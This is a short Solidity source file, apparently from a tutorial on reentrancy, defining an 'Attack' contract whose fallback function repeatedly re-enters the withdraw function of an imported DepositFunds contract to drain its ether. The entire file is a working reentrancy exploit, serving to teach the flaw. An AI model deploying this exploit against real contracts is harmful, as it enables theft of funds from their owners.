// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./DepositFunds.sol";

// Source:https://hackernoon.com/hack-solidity-reentrancy-attack

contract Attack {
    DepositFunds public depositFunds;

    constructor(address _depositFundsAddress) {
        depositFunds = DepositFunds(_depositFundsAddress);
    }

    // Fallback is called when DepositFunds sends Ether to this contract.
    fallback() external payable {
        if (address(depositFunds).balance >= 1 ether) {
            depositFunds.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        depositFunds.deposit{value: 1 ether}();
        depositFunds.withdraw();
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

}